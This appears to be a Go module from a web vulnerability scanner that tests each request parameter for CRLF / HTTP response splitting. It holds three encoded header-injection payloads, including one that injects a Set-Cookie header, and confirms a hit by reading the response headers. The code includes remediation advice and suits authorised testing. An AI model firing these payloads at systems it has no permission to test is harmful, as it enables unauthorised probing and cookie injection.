package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"strings"
)

type CRLFModule struct{}

func NewCRLFModule() *CRLFModule {
	return &CRLFModule{}
}

func (m *CRLFModule) Name() string {
	return "crlf"
}

func (m *CRLFModule) Description() string {
	return "CRLF / HTTP Response Splitting & Header Injection"
}

var crlfPayloads = []struct {
	Name    string
	Payload string
}{
	{"URL-Encoded CRLF", "%0d%0aX-Injected-Header:%20nflx_crlf"},
	{"Double URL-Encoded CRLF", "%250d%250aX-Injected-Header:%20nflx_crlf"},
	{"Set-Cookie CRLF", "%0d%0aSet-Cookie:%20nflx_crlf=1"},
}

func (m *CRLFModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	for _, param := range target.Parameters() {
		for _, probe := range crlfPayloads {
			var resp *client.Response
			var err error
			if isPost {
				resp, err = c.Request("POST", target.URL, target.BuildDataWithRawParam(param, probe.Payload), nil)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithRawParam(param, probe.Payload), "", nil)
			}

			if err != nil || resp == nil {
				continue
			}

			// Check if injected header was processed into HTTP response headers
			injectedVal := resp.Headers.Get("X-Injected-Header")
			cookieVal := resp.Headers.Get("Set-Cookie")

			if injectedVal == "nflx_crlf" || strings.Contains(cookieVal, "nflx_crlf=1") {
				evidence := fmt.Sprintf("X-Injected-Header: %s | Set-Cookie: %s", injectedVal, cookieVal)
				finding := &Finding{
					Module:      m.Name(),
					Title:       "CRLF / HTTP Header Injection (Response Splitting)",
					Severity:    SeverityHigh,
					URL:         target.URL,
					Parameter:   param,
					Payload:     probe.Payload,
					Detail:      fmt.Sprintf("Parameter '%s' permitted carriage return/line feed injection into server response headers via '%s'.", param, probe.Name),
					Evidence:    evidence,
					Remediation: "Strip or reject CR (%0d, \\r) and LF (%0a, \\n) characters from all user input before including it in HTTP response headers.",
					CWEID:       113,
				}
				finding.SetConfidence(ConfidenceConfirmed)
				findings = append(findings, finding)
				break
			}
		}
	}

	return findings, nil
}
